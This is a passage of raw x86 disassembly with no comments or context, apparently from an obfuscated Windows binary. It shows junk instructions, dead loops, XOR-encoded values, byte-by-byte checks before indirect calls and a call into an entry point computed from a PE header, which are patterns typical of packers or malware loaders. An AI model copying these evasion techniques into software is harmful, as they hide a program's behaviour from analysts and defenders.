  4208a7:	mov    DWORD PTR [esp+0xc],0xf89c85a4
  4208af:	lea    eax,[esp+0x3c]
  4208b3:	mov    DWORD PTR [esp+0x30],eax
  4208b7:	lea    eax,[esp+0x38]
  4208bb:	mov    DWORD PTR [esp+0x18],eax
  4208bf:	mov    eax,ds:0x432373
  4208c4:	mov    ebx,DWORD PTR ds:0x432edf
  4208ca:	mov    esi,DWORD PTR ds:0x43b58b
  4208d0:	sub    esi,ebx
  4208d2:	or     ebx,DWORD PTR [ebx+esi*1]
  4208d5:	mov    eax,DWORD PTR [eax+0x1c8]
  4208db:	mov    eax,DWORD PTR [eax]
  4208dd:	and    DWORD PTR ds:0x432eaf,0x0
  4208e7:	mov    ebx,DWORD PTR ds:0x432eaf
  4208ed:	inc    ebx
  4208ee:	mov    DWORD PTR ds:0x432eaf,ebx
  4208f4:	cmp    DWORD PTR ds:0x432eaf,0x2d
  4208fb:	jle    0x42091e
  420901:	jmp    0x420911
  420906:	push   0x432189
  42090b:	call   DWORD PTR ds:0x43fddb
  420911:	cmp    DWORD PTR ds:0x432eaf,0x1d
  420918:	jb     0x4208e7
  42091e:	mov    edx,DWORD PTR [esp+0x18]
  420922:	sub    DWORD PTR ds:0x432e37,0x432e2f
  42092c:	mov    esi,0x75108af
  420931:	and    DWORD PTR ds:0x432e5f,0x432e8b
  42093b:	xor    eax,esi
  42093d:	mov    DWORD PTR ds:0x432e53,0x1b
  420947:	cmp    DWORD PTR ds:0x432e53,0x0
  42094e:	je     0x42099d
  420954:	cmp    DWORD PTR ds:0x432e53,0x7
  42095b:	jb     0x42099d
  420961:	jmp    0x420971
  420966:	push   0x231a
  42096b:	call   DWORD PTR ds:0x43fddf
  420971:	cmp    DWORD PTR ds:0x432e53,0x8
  420978:	jne    0x42098b
  42097e:	mov    ebx,DWORD PTR ds:0x432e53
  420984:	dec    ebx
  420985:	mov    DWORD PTR ds:0x432e53,ebx
  42098b:	mov    ebx,DWORD PTR ds:0x432e53
  420991:	dec    ebx
  420992:	mov    DWORD PTR ds:0x432e53,ebx
  420998:	jmp    0x420947
  42099d:	mov    ebx,0x3272f6
  4209a2:	add    eax,ebx
  4209a4:	mov    DWORD PTR ds:0x432ec3,0x767b
  4209ae:	mov    DWORD PTR [edx],eax
  4209b0:	mov    eax,ds:0x432cef
  4209b5:	mov    DWORD PTR ds:0x432e5f,0x7551
  4209bf:	cmp    eax,0x455dedfa
  4209c4:	mov    DWORD PTR ds:0x432e9f,0x7198
  4209ce:	jne    0x420a43
  4209d4:	or     DWORD PTR ds:0x432e3b,edi
  4209da:	mov    eax,DWORD PTR [esp+0x20]
  4209de:	mov    edx,DWORD PTR ds:0x432373
  4209e4:	mov    DWORD PTR ds:0x432e63,0x33b4
  4209ee:	mov    edx,DWORD PTR [edx+0x198]
  4209f4:	xor    eax,esi
  4209f6:	inc    DWORD PTR ds:0x432e6b
  4209fc:	add    eax,ebx
  4209fe:	mov    DWORD PTR [edx],eax
  420a00:	mov    eax,DWORD PTR [esp+0x20]
  420a04:	xor    DWORD PTR ds:0x432e57,0x1a38
  420a0e:	xor    eax,esi
  420a10:	add    eax,ebx
  420a12:	adc    DWORD PTR ds:0x432e23,0x304d
  420a1c:	mov    ds:0x432cef,eax
  420a21:	and    eax,0x47de
  420a26:	mov    eax,DWORD PTR [esp+0x20]
  420a2a:	adc    DWORD PTR ds:0x432e9b,0x432e27
  420a34:	xor    eax,esi
  420a36:	add    eax,ebx
  420a38:	inc    DWORD PTR ds:0x432ebb
  420a3e:	mov    ds:0x43246b,eax
  420a43:	and    DWORD PTR ds:0x432e43,0x0
  420a4d:	mov    eax,ds:0x432e43
  420a52:	inc    eax
  420a53:	mov    ds:0x432e43,eax
  420a58:	cmp    DWORD PTR ds:0x432e43,0x28
  420a5f:	ja     0x420a82
  420a65:	jmp    0x420a75
  420a6a:	push   0x43215b
  420a6f:	call   DWORD PTR ds:0x43fde3
  420a75:	cmp    DWORD PTR ds:0x432e43,0x1e
  420a7c:	jb     0x420a4d
  420a82:	mov    eax,ds:0x432373
  420a87:	adc    DWORD PTR ds:0x432e9f,0x432e87
  420a91:	mov    eax,DWORD PTR [eax+0x18c]
  420a97:	mov    eax,DWORD PTR [eax]
  420a99:	mov    DWORD PTR [esp+0x40],eax
  420a9d:	mov    eax,0xf89c85a1
  420aa2:	add    DWORD PTR ds:0x432ec3,0x432e3f
  420aac:	mov    DWORD PTR [esp+0x10],eax
  420ab0:	sub    DWORD PTR ds:0x432eab,0x432e2f
  420aba:	mov    DWORD PTR [esp+0x10],eax
  420abe:	and    DWORD PTR ds:0x432e97,0x432e8f
  420ac8:	mov    DWORD PTR [esp+0x10],eax
  420acc:	sub    DWORD PTR ds:0x432e9f,0x432e8f
  420ad6:	mov    DWORD PTR [esp+0x10],ecx
  420ada:	add    DWORD PTR ds:0x432e5b,0x398e
  420ae4:	mov    DWORD PTR [esp+0x18],eax
  420ae8:	adc    DWORD PTR ds:0x432ecb,0x1d27
  420af2:	mov    DWORD PTR [esp+0x18],0xf89c85bd
  420afa:	add    DWORD PTR ds:0x432e83,edi
  420b00:	mov    eax,DWORD PTR [esp+0x20]
  420b04:	sbb    DWORD PTR ds:0x432e5b,0x432ebf
  420b0e:	xor    eax,esi
  420b10:	or     DWORD PTR ds:0x432ebb,0x432e7f
  420b1a:	add    eax,ebx
  420b1c:	mov    DWORD PTR ds:0x432e37,0x4b61
  420b26:	jmp    0x420d1e
  420b2b:	mov    DWORD PTR ds:0x432ea7,0x2827
  420b35:	mov    al,ds:0x4324e8
  420b3a:	mov    DWORD PTR ds:0x432ecb,0x2eff
  420b44:	cmp    al,BYTE PTR ds:0x4324f9
  420b4a:	jne    0x420849
  420b50:	mov    DWORD PTR ds:0x432e3f,0x3779
  420b5a:	mov    al,ds:0x432505
  420b5f:	mov    DWORD PTR ds:0x432e67,0xc1e
  420b69:	cmp    al,BYTE PTR ds:0x432516
  420b6f:	jne    0x420849
  420b75:	or     DWORD PTR ds:0x432e53,0x432ec3
  420b7f:	push   0x43251f
  420b84:	or     DWORD PTR ds:0x432eb7,0x432ebb
  420b8e:	push   0x43252b
  420b93:	sub    DWORD PTR ds:0x432e9f,0x10e
  420b9d:	call   edi
  420b9f:	xor    DWORD PTR ds:0x432e93,0x265a
  420ba9:	test   eax,eax
  420bab:	je     0x420849
  420bb1:	mov    al,ds:0x432538
  420bb6:	mov    DWORD PTR ds:0x432e5f,0x67be
  420bc0:	cmp    al,BYTE PTR ds:0x432549
  420bc6:	mov    DWORD PTR ds:0x432ecb,0x75a8
  420bd0:	jne    0x420849
  420bd6:	mov    DWORD PTR ds:0x432e6f,0x3bcf
  420be0:	mov    al,ds:0x432555
  420be5:	mov    DWORD PTR ds:0x432e6b,0x562a
  420bef:	cmp    al,BYTE PTR ds:0x432566
  420bf5:	jne    0x420849
  420bfb:	adc    DWORD PTR ds:0x432e2f,0x432ec3
  420c05:	push   0x43256f
  420c0a:	add    DWORD PTR ds:0x432ecb,0x432e87
  420c14:	push   0x43257b
  420c19:	call   edi
  420c1b:	and    DWORD PTR ds:0x432e6b,0x4f9f
  420c25:	test   eax,eax
  420c27:	je     0x420849
  420c2d:	sub    eax,DWORD PTR ds:0x432e9b
  420c33:	mov    eax,DWORD PTR [esp+0xc]
  420c37:	mov    ecx,DWORD PTR [esp+0x18]
  420c3b:	add    DWORD PTR ds:0x432e93,0x1aa1
  420c45:	xor    eax,esi
  420c47:	lea    eax,[eax+ecx*1+0x3272f6]
  420c4e:	and    DWORD PTR ds:0x432e5f,0x6940
  420c58:	push   eax
  420c59:	or     eax,DWORD PTR ds:0x432e5b
  420c5f:	mov    eax,DWORD PTR [esp+0x14]
  420c63:	xor    eax,esi
  420c65:	or     DWORD PTR ds:0x432e77,0x432e6f
  420c6f:	lea    eax,[ebp+eax*1+0x3272fe]
  420c76:	adc    DWORD PTR ds:0x432eb7,0x2832
  420c80:	push   eax
  420c81:	mov    eax,ds:0x432373
  420c86:	push   DWORD PTR [eax+0x1bc]
  420c8c:	sbb    DWORD PTR ds:0x432eb7,0x432ebb
  420c96:	call   0x421896
  420c9b:	mov    eax,DWORD PTR [esp+0xc]
  420c9f:	mov    edx,DWORD PTR ds:0x432e9f
  420ca5:	or     edx,DWORD PTR ds:0x432e7b
  420cab:	mov    DWORD PTR ds:0x432e9f,edx
  420cb1:	mov    ecx,DWORD PTR [esp+0x18]
  420cb5:	mov    DWORD PTR ds:0x432e9f,0x15
  420cbf:	cmp    DWORD PTR ds:0x432e9f,0x0
  420cc6:	je     0x420d15
  420ccc:	cmp    DWORD PTR ds:0x432e9f,0x5
  420cd3:	jle    0x420d15
  420cd9:	jmp    0x420ce9
  420cde:	push   0x75d1
  420ce3:	call   DWORD PTR ds:0x43fde7
  420ce9:	cmp    DWORD PTR ds:0x432e9f,0x6
  420cf0:	jne    0x420d03
  420cf6:	mov    edx,DWORD PTR ds:0x432e9f
  420cfc:	dec    edx
  420cfd:	mov    DWORD PTR ds:0x432e9f,edx
  420d03:	mov    edx,DWORD PTR ds:0x432e9f
  420d09:	dec    edx
  420d0a:	mov    DWORD PTR ds:0x432e9f,edx
  420d10:	jmp    0x420cbf
  420d15:	xor    eax,esi
  420d17:	lea    eax,[ecx+eax*1+0x3272f6]
  420d1e:	and    DWORD PTR ds:0x432ea3,0x0
  420d28:	jmp    0x420d3c
  420d2d:	xor    ecx,ecx
  420d2f:	add    ecx,DWORD PTR ds:0x432ea3
  420d35:	inc    ecx
  420d36:	mov    DWORD PTR ds:0x432ea3,ecx
  420d3c:	cmp    DWORD PTR ds:0x432ea3,0x1b
  420d43:	jae    0x420d83
  420d49:	cmp    DWORD PTR ds:0x432ea3,0x4
  420d50:	jle    0x420d83
  420d56:	jmp    0x420d64
  420d5b:	push   DWORD PTR [ebp-0x18]
  420d5e:	call   DWORD PTR ds:0x43fdeb
  420d64:	cmp    DWORD PTR ds:0x432ea3,0x3
  420d6b:	jne    0x420d7e
  420d71:	mov    ecx,DWORD PTR ds:0x432ea3
  420d77:	inc    ecx
  420d78:	mov    DWORD PTR ds:0x432ea3,ecx
  420d7e:	jmp    0x420d2d
  420d83:	mov    ecx,DWORD PTR [esp+0xc]
  420d87:	mov    edx,DWORD PTR [esp+0xc]
  420d8b:	and    DWORD PTR ds:0x432e7f,0x27c9
  420d95:	xor    edx,esi
  420d97:	xor    ecx,esi
  420d99:	add    ecx,edx
  420d9b:	and    DWORD PTR ds:0x432eb7,0x0
  420da5:	mov    edx,DWORD PTR ds:0x432eb7
  420dab:	inc    edx
  420dac:	mov    DWORD PTR ds:0x432eb7,edx
  420db2:	cmp    DWORD PTR ds:0x432eb7,0x23
  420db9:	jg     0x420de1
  420dbf:	jmp    0x420dd4
  420dc4:	push   0x432e3f
  420dc9:	push   0x584f
  420dce:	call   DWORD PTR ds:0x43fdef
  420dd4:	cmp    DWORD PTR ds:0x432eb7,0x1b
  420ddb:	jb     0x420da5
  420de1:	mov    edx,DWORD PTR [esp+0xc]
  420de5:	mov    DWORD PTR ds:0x432e97,0x4e1f
  420def:	xor    edx,esi
  420df1:	lea    ecx,[ecx+edx*1+0x9758e2]
  420df8:	mov    DWORD PTR ds:0x432e83,0x69c
  420e02:	mov    DWORD PTR [esp+0x18],eax
  420e06:	mov    DWORD PTR ds:0x432ebf,0x5f48
  420e10:	cmp    eax,ecx
  420e12:	mov    DWORD PTR ds:0x432e3f,0x5aa0
  420e1c:	jbe    0x420b2b
  420e22:	not    eax
  420e24:	mov    eax,DWORD PTR [ebp+0xc]
  420e27:	and    ecx,0x5ce1
  420e2d:	mov    ds:0x4321f7,eax
  420e32:	mov    eax,DWORD PTR [ebp+0x10]
  420e35:	mov    DWORD PTR ds:0x432e87,0x15
  420e3f:	cmp    DWORD PTR ds:0x432e87,0x0
  420e46:	je     0x420e96
  420e4c:	cmp    DWORD PTR ds:0x432e87,0x6
  420e53:	jb     0x420e96
  420e59:	jmp    0x420e6a
  420e5e:	push   DWORD PTR [ebp-0x14]
  420e61:	push   DWORD PTR [ebp-0x1c]
  420e64:	call   DWORD PTR ds:0x43fdf3
  420e6a:	cmp    DWORD PTR ds:0x432e87,0x7
  420e71:	jne    0x420e84
  420e77:	mov    ecx,DWORD PTR ds:0x432e87
  420e7d:	dec    ecx
  420e7e:	mov    DWORD PTR ds:0x432e87,ecx
  420e84:	mov    ecx,DWORD PTR ds:0x432e87
  420e8a:	dec    ecx
  420e8b:	mov    DWORD PTR ds:0x432e87,ecx
  420e91:	jmp    0x420e3f
  420e96:	mov    ds:0x432453,eax
  420e9b:	mov    eax,ds:0x4321f7
  420ea0:	mov    ecx,DWORD PTR ds:0x432e9b
  420ea6:	adc    ecx,DWORD PTR ds:0x432ec3
  420eac:	mov    DWORD PTR ds:0x432e9b,ecx
  420eb2:	mov    ecx,DWORD PTR [esp+0x30]
  420eb6:	sub    eax,ebx
  420eb8:	xor    eax,esi
  420eba:	mov    DWORD PTR ds:0x432ecb,0x2418
  420ec4:	mov    DWORD PTR [ecx],eax
  420ec6:	mov    DWORD PTR ds:0x432e97,0x6c0e
  420ed0:	lea    eax,[esp+0x2c]
  420ed4:	mov    DWORD PTR [esp+0x44],eax
  420ed8:	mov    DWORD PTR ds:0x432ea3,0x17d
  420ee2:	lea    eax,[ebp+0x4]
  420ee5:	mov    DWORD PTR [esp+0x2c],eax
  420ee9:	mov    DWORD PTR ds:0x432ec3,0x4441
  420ef3:	mov    al,ds:0x432588
  420ef8:	cmp    al,BYTE PTR ds:0x432599
  420efe:	mov    DWORD PTR ds:0x432e47,0x46bb
  420f08:	jne    0x420849
  420f0e:	mov    al,ds:0x4325a5
  420f13:	cmp    al,BYTE PTR ds:0x4325b6
  420f19:	mov    DWORD PTR ds:0x432eaf,0x61de
  420f23:	jne    0x420849
  420f29:	mov    DWORD PTR ds:0x432ea7,0xc38
  420f33:	push   0x4325bf
  420f38:	sbb    DWORD PTR ds:0x432e8b,0x432e7f
  420f42:	push   0x4325cb
  420f47:	call   edi
  420f49:	test   eax,eax
  420f4b:	mov    DWORD PTR ds:0x432e4b,0x74a1
  420f55:	je     0x420849
  420f5b:	mov    al,ds:0x4325d8
  420f60:	mov    DWORD PTR ds:0x432e27,0x62c3
  420f6a:	cmp    al,BYTE PTR ds:0x4325e9
  420f70:	jne    0x420849
  420f76:	mov    DWORD PTR ds:0x432e5b,0x5f7d
  420f80:	mov    al,ds:0x4325f5
  420f85:	mov    DWORD PTR ds:0x432e3b,0x1797
  420f8f:	cmp    al,BYTE PTR ds:0x432606
  420f95:	jne    0x420849
  420f9b:	push   0x43260f
  420fa0:	add    DWORD PTR ds:0x432ebf,0x432eab
  420faa:	push   0x43261b
  420faf:	call   edi
  420fb1:	test   eax,eax
  420fb3:	je     0x420849
  420fb9:	mov    DWORD PTR ds:0x432e67,0x333a
  420fc3:	mov    al,ds:0x432628
  420fc8:	cmp    al,BYTE PTR ds:0x432639
  420fce:	jne    0x420849
  420fd4:	mov    DWORD PTR ds:0x432e63,0x2ea7
  420fde:	mov    al,ds:0x432645
  420fe3:	mov    DWORD PTR ds:0x432e83,0x19a
  420fed:	cmp    al,BYTE PTR ds:0x432656
  420ff3:	mov    DWORD PTR ds:0x432ec3,0xb46
  420ffd:	jne    0x420849
  421003:	xor    DWORD PTR ds:0x432e4b,0x432e9b
  42100d:	push   0x43265f
  421012:	xor    DWORD PTR ds:0x432ea7,0x432ebf
  42101c:	push   0x43266b
  421021:	adc    DWORD PTR ds:0x432e7b,0x432e97
  42102b:	call   edi
  42102d:	test   eax,eax
  42102f:	je     0x420849
  421035:	mov    DWORD PTR ds:0x432eab,0x160c
  42103f:	mov    al,ds:0x432678
  421044:	cmp    al,BYTE PTR ds:0x432689
  42104a:	mov    DWORD PTR ds:0x432e33,0x7fda
  421054:	jne    0x420849
  42105a:	mov    DWORD PTR ds:0x432eb3,0x205
  421064:	mov    al,ds:0x432695
  421069:	mov    DWORD PTR ds:0x432ea7,0x1bc1
  421073:	cmp    al,BYTE PTR ds:0x4326a6
  421079:	mov    DWORD PTR ds:0x432e2f,0xcbc
  421083:	jne    0x420849
  421089:	push   0x4326af
  42108e:	xor    DWORD PTR ds:0x432e73,0x432e53
  421098:	push   0x4326bb
  42109d:	call   edi
  42109f:	test   eax,eax
  4210a1:	mov    DWORD PTR ds:0x432e7f,0x3ee2
  4210ab:	je     0x420849
  4210b1:	mov    DWORD PTR ds:0x432e73,0x4aa5
  4210bb:	mov    al,ds:0x4326c8
  4210c0:	mov    DWORD PTR ds:0x432e73,0x2576
  4210ca:	cmp    al,BYTE PTR ds:0x4326d9
  4210d0:	jne    0x420849
  4210d6:	mov    al,ds:0x4326e5
  4210db:	mov    DWORD PTR ds:0x432eab,0x2fd2
  4210e5:	cmp    al,BYTE PTR ds:0x4326f6
  4210eb:	mov    DWORD PTR ds:0x432e77,0x665f
  4210f5:	jne    0x420849
  4210fb:	push   0x4326ff
  421100:	xor    DWORD PTR ds:0x432eab,0x43e0
  42110a:	push   0x43270b
  42110f:	call   edi
  421111:	add    DWORD PTR ds:0x432eaf,0x432e77
  42111b:	test   eax,eax
  42111d:	mov    DWORD PTR ds:0x432e7f,0x618e
  421127:	je     0x420849
  42112d:	mov    al,ds:0x432718
  421132:	mov    DWORD PTR ds:0x432ebb,0x5321
  42113c:	cmp    al,BYTE PTR ds:0x432729
  421142:	jne    0x420849
  421148:	mov    al,ds:0x432735
  42114d:	cmp    al,BYTE PTR ds:0x432746
  421153:	jne    0x420849
  421159:	adc    DWORD PTR ds:0x432ea7,0x4891
  421163:	push   0x43274f
  421168:	xor    DWORD PTR ds:0x432ecb,0x432ec3
  421172:	push   0x43275b
  421177:	call   edi
  421179:	xor    DWORD PTR ds:0x432ecb,0x432e67
  421183:	test   eax,eax
  421185:	mov    DWORD PTR ds:0x432e77,0x34d8
  42118f:	je     0x420849
  421195:	mov    DWORD PTR ds:0x432e63,0x47d8
  42119f:	mov    al,ds:0x432768
  4211a4:	mov    DWORD PTR ds:0x432ebb,0x60f8
  4211ae:	cmp    al,BYTE PTR ds:0x432779
  4211b4:	mov    DWORD PTR ds:0x432e63,0x352f
  4211be:	jne    0x420849
  4211c4:	mov    al,ds:0x432785
  4211c9:	mov    DWORD PTR ds:0x432e37,0x65de
  4211d3:	cmp    al,BYTE PTR ds:0x432796
  4211d9:	mov    DWORD PTR ds:0x432e3f,0x2ba7
  4211e3:	jne    0x420849
  4211e9:	push   0x43279f
  4211ee:	sbb    DWORD PTR ds:0x432e6b,0x25d3
  4211f8:	push   0x4327ab
  4211fd:	call   edi
  4211ff:	adc    DWORD PTR ds:0x432ebf,0x432ea3
  421209:	test   eax,eax
  42120b:	mov    DWORD PTR ds:0x432e6f,0x1c88
  421215:	je     0x420849
  42121b:	not    DWORD PTR ds:0x432e63
  421221:	mov    al,ds:0x4327b8
  421226:	cmp    al,BYTE PTR ds:0x4327c9
  42122c:	jne    0x420849
  421232:	mov    al,ds:0x4327d5
  421237:	mov    DWORD PTR ds:0x432e7b,0x5e30
  421241:	cmp    al,BYTE PTR ds:0x4327e6
  421247:	mov    DWORD PTR ds:0x432e9b,0x700f
  421251:	jne    0x420849
  421257:	or     DWORD PTR ds:0x432e83,0x99a
  421261:	push   0x4327ef
  421266:	adc    DWORD PTR ds:0x432e9f,0x22ee
  421270:	push   0x4327fb
  421275:	adc    DWORD PTR ds:0x432ecb,0x432ec3
  42127f:	call   edi
  421281:	sub    DWORD PTR ds:0x432e43,0x72f1
  42128b:	test   eax,eax
  42128d:	je     0x420849
  421293:	mov    DWORD PTR ds:0x432e57,0x70e
  42129d:	mov    al,ds:0x432808
  4212a2:	cmp    al,BYTE PTR ds:0x432819
  4212a8:	jne    0x420849
  4212ae:	mov    al,ds:0x432825
  4212b3:	mov    DWORD PTR ds:0x432ea3,0x4a62
  4212bd:	cmp    al,BYTE PTR ds:0x432836
  4212c3:	mov    DWORD PTR ds:0x432ea7,0x4507
  4212cd:	jne    0x420849
  4212d3:	sbb    DWORD PTR ds:0x432e23,0x432e6f
  4212dd:	push   0x43283f
  4212e2:	xor    DWORD PTR ds:0x432e2b,0x432e87
  4212ec:	push   0x43284b
  4212f1:	or     DWORD PTR ds:0x432e8f,0x432e6b
  4212fb:	call   edi
  4212fd:	test   eax,eax
  4212ff:	mov    DWORD PTR ds:0x432ec7,0x3c0e
  421309:	je     0x420849
  42130f:	mov    DWORD PTR ds:0x432e2f,0x1c83
  421319:	mov    al,ds:0x432858
  42131e:	cmp    al,BYTE PTR ds:0x432869
  421324:	jne    0x420849
  42132a:	mov    al,ds:0x432875
  42132f:	mov    DWORD PTR ds:0x432eab,0x7836
  421339:	cmp    al,BYTE PTR ds:0x432886
  42133f:	mov    DWORD PTR ds:0x432e33,0x5d16
  421349:	jne    0x420849
  42134f:	push   0x43288f
  421354:	or     DWORD PTR ds:0x432e6f,0x432e43
  42135e:	push   0x43289b
  421363:	adc    DWORD PTR ds:0x432e6f,0x64ad
  42136d:	call   edi
  42136f:	and    DWORD PTR ds:0x432e93,0x432eb3
  421379:	test   eax,eax
  42137b:	je     0x420849
  421381:	mov    al,ds:0x4328a8
  421386:	cmp    al,BYTE PTR ds:0x4328b9
  42138c:	mov    DWORD PTR ds:0x432e2b,0x5e8c
  421396:	jne    0x420849
  42139c:	mov    DWORD PTR ds:0x432ea3,0x4898
  4213a6:	mov    al,ds:0x4328c5
  4213ab:	cmp    al,BYTE PTR ds:0x4328d6
  4213b1:	jne    0x420849
  4213b7:	push   0x4328df
  4213bc:	push   0x4328eb
  4213c1:	call   edi
  4213c3:	test   eax,eax
  4213c5:	mov    DWORD PTR ds:0x432ebb,0xe84
  4213cf:	je     0x420849
  4213d5:	mov    al,ds:0x4328f8
  4213da:	cmp    al,BYTE PTR ds:0x432909
  4213e0:	mov    DWORD PTR ds:0x432e3b,0x418e
  4213ea:	jne    0x420849
  4213f0:	mov    DWORD PTR ds:0x432e5b,0x25d1
  4213fa:	mov    al,ds:0x432915
  4213ff:	cmp    al,BYTE PTR ds:0x432926
  421405:	mov    DWORD PTR ds:0x432e6b,0x4b5f
  42140f:	jne    0x420849
  421415:	push   0x43292f
  42141a:	adc    DWORD PTR ds:0x432ec7,0x4db7
  421424:	push   0x43293b
  421429:	sbb    DWORD PTR ds:0x432e6b,0x432ebf
  421433:	call   edi
  421435:	sub    DWORD PTR ds:0x432e33,0x432e97
  42143f:	test   eax,eax
  421441:	mov    DWORD PTR ds:0x432ec7,0x19ef
  42144b:	je     0x420849
  421451:	mov    al,ds:0x432948
  421456:	cmp    al,BYTE PTR ds:0x432959
  42145c:	jne    0x420849
  421462:	mov    al,ds:0x432965
  421467:	cmp    al,BYTE PTR ds:0x432976
  42146d:	jne    0x420849
  421473:	push   0x43297f
  421478:	push   0x43298b
  42147d:	call   edi
  42147f:	test   eax,eax
  421481:	je     0x420849
  421487:	mov    al,ds:0x432998
  42148c:	cmp    al,BYTE PTR ds:0x4329a9
  421492:	jne    0x420849
  421498:	mov    al,ds:0x4329b5
  42149d:	cmp    al,BYTE PTR ds:0x4329c6
  4214a3:	jne    0x420849
  4214a9:	push   0x4329cf
  4214ae:	push   0x4329db
  4214b3:	call   edi
  4214b5:	test   eax,eax
  4214b7:	je     0x420849
  4214bd:	mov    al,ds:0x4329e8
  4214c2:	cmp    al,BYTE PTR ds:0x4329f9
  4214c8:	jne    0x420849
  4214ce:	mov    al,ds:0x432a05
  4214d3:	cmp    al,BYTE PTR ds:0x432a16
  4214d9:	jne    0x420849
  4214df:	push   0x432a1f
  4214e4:	push   0x432a2b
  4214e9:	call   edi
  4214eb:	test   eax,eax
  4214ed:	je     0x420849
  4214f3:	mov    al,ds:0x432a38
  4214f8:	cmp    al,BYTE PTR ds:0x432a49
  4214fe:	jne    0x420849
  421504:	mov    al,ds:0x432a55
  421509:	cmp    al,BYTE PTR ds:0x432a66
  42150f:	jne    0x420849
  421515:	push   0x432a6f
  42151a:	push   0x432a7b
  42151f:	call   edi
  421521:	test   eax,eax
  421523:	je     0x420849
  421529:	mov    al,ds:0x432a88
  42152e:	cmp    al,BYTE PTR ds:0x432a99
  421534:	jne    0x420849
  42153a:	mov    al,ds:0x432aa5
  42153f:	cmp    al,BYTE PTR ds:0x432ab6
  421545:	jne    0x420849
  42154b:	push   0x432abf
  421550:	push   0x432acb
  421555:	call   edi
  421557:	test   eax,eax
  421559:	je     0x420849
  42155f:	mov    al,ds:0x432ad8
  421564:	cmp    al,BYTE PTR ds:0x432ae9
  42156a:	jne    0x420849
  421570:	mov    al,ds:0x432af5
  421575:	cmp    al,BYTE PTR ds:0x432b06
  42157b:	jne    0x420849
  421581:	push   0x432b0f
  421586:	push   0x432b1b
  42158b:	call   edi
  42158d:	test   eax,eax
  42158f:	je     0x420849
  421595:	mov    al,ds:0x432b28
  42159a:	cmp    al,BYTE PTR ds:0x432b39
  4215a0:	jne    0x420849
  4215a6:	mov    al,ds:0x432b45
  4215ab:	cmp    al,BYTE PTR ds:0x432b56
  4215b1:	jne    0x420849
  4215b7:	push   0x432b5f
  4215bc:	push   0x432b6b
  4215c1:	call   edi
  4215c3:	test   eax,eax
  4215c5:	je     0x420849
  4215cb:	mov    al,ds:0x432b78
  4215d0:	cmp    al,BYTE PTR ds:0x432b89
  4215d6:	jne    0x420849
  4215dc:	mov    al,ds:0x432b95
  4215e1:	cmp    al,BYTE PTR ds:0x432ba6
  4215e7:	jne    0x420849
  4215ed:	push   0x432baf
  4215f2:	push   0x432bbb
  4215f7:	call   edi
  4215f9:	test   eax,eax
  4215fb:	je     0x420849
  421601:	mov    al,ds:0x432bc8
  421606:	cmp    al,BYTE PTR ds:0x432bd9
  42160c:	jne    0x420849
  421612:	mov    al,ds:0x432be5
  421617:	cmp    al,BYTE PTR ds:0x432bf6
  42161d:	jne    0x420849
  421623:	push   0x432bff
  421628:	push   0x432c0b
  42162d:	call   edi
  42162f:	test   eax,eax
  421631:	je     0x420849
  421637:	mov    eax,DWORD PTR [esp+0x3c]
  42163b:	cmp    eax,0xf89c85a4
  421640:	je     0x42169f
  421646:	mov    eax,DWORD PTR [esp+0x20]
  42164a:	mov    ecx,DWORD PTR [esp+0x38]
  42164e:	xor    eax,esi
  421650:	add    eax,ebx
  421652:	cmp    eax,ecx
  421654:	je     0x42169f
  42165a:	mov    eax,ds:0x432373
  42165f:	mov    eax,DWORD PTR [eax+0x194]
  421665:	mov    ecx,DWORD PTR [eax]
  421667:	mov    eax,DWORD PTR [ecx+0x3c]
  42166a:	push   DWORD PTR ds:0x432453
  421670:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  421674:	push   DWORD PTR ds:0x4321f7
  42167a:	add    eax,ecx
  42167c:	mov    ecx,DWORD PTR ds:0x432373
  421682:	mov    ecx,DWORD PTR [ecx+0x194]
  421688:	push   DWORD PTR [ecx]
  42168a:	call   eax
  42168c:	mov    ecx,DWORD PTR ds:0x432373
  421692:	mov    ecx,DWORD PTR [ecx+0x1cc]
  421698:	mov    DWORD PTR [ecx],eax
  42169a:	jmp    0x421870
  42169f:	mov    eax,DWORD PTR [esp+0x20]
  4216a3:	mov    ecx,DWORD PTR [esp+0x40]
  4216a7:	xor    eax,esi
  4216a9:	add    eax,ebx
  4216ab:	cmp    eax,ecx
  4216ad:	jne    0x421718
  4216b3:	mov    eax,DWORD PTR [esp+0x20]
  4216b7:	mov    ecx,DWORD PTR ds:0x432373
  4216bd:	mov    ecx,DWORD PTR [ecx+0x198]
  4216c3:	xor    eax,esi
  4216c5:	add    eax,ebx
  4216c7:	cmp    eax,DWORD PTR [ecx]
  4216c9:	jne    0x4216f1
  4216cf:	mov    eax,DWORD PTR [esp+0x20]
  4216d3:	push   0xffffffff
  4216d5:	push   0x70941f91
  4216da:	xor    eax,esi
  4216dc:	add    eax,ebx
  4216de:	push   eax
  4216df:	push   0xf89c85a1
  4216e4:	push   DWORD PTR [esp+0x1c]
  4216e8:	push   DWORD PTR [esp+0x34]
  4216ec:	call   0x41b999
  4216f1:	push   DWORD PTR [esp+0xc]
  4216f5:	push   DWORD PTR [esp+0x24]
  4216f9:	call   0x401000
  4216fe:	mov    eax,DWORD PTR [esp+0x20]
  421702:	xor    eax,esi
  421704:	add    eax,ebx
  421706:	mov    ds:0x4323ff,eax
  42170b:	mov    eax,DWORD PTR [esp+0x20]
  42170f:	xor    eax,esi
  421711:	add    eax,ebx
  421713:	mov    ds:0x4323f7,eax
  421718:	mov    eax,DWORD PTR [esp+0x2c]
  42171c:	test   eax,eax
  42171e:	je     0x421870
  421724:	mov    DWORD PTR [esp+0x4c],0xf152c3c
  42172c:	mov    DWORD PTR [esp+0x54],0x712ed2f
  421734:	mov    DWORD PTR [esp+0x48],0x373fc0d
  42173c:	mov    DWORD PTR [esp+0x50],0x72670add
  421744:	call   0x41932f
  421749:	mov    eax,DWORD PTR [esp+0x34]
  42174d:	mov    eax,DWORD PTR [esp+0xc]
  421751:	mov    DWORD PTR [esp+0x30],eax
  421755:	mov    eax,DWORD PTR [esp+0x20]
  421759:	mov    DWORD PTR [esp+0xc],eax
  42175d:	mov    eax,eax
  42175f:	mov    eax,ds:0x432373
  421764:	mov    ecx,DWORD PTR [eax+0x1c0]
  42176a:	mov    edx,DWORD PTR [ecx]
  42176c:	and    DWORD PTR [esp+0x14],0x0
  421771:	mov    edi,0xfabdbed2
  421776:	add    edx,edi
  421778:	adc    DWORD PTR [esp+0x14],0xffffffff
  42177d:	mov    ecx,0x8a29a143
  421782:	xor    edx,ecx
  421784:	mov    DWORD PTR [esp+0x18],edx
  421788:	mov    edx,DWORD PTR [esp+0x14]
  42178c:	xor    edx,0x0
  42178f:	cmp    DWORD PTR [esp+0x18],0x70941f90
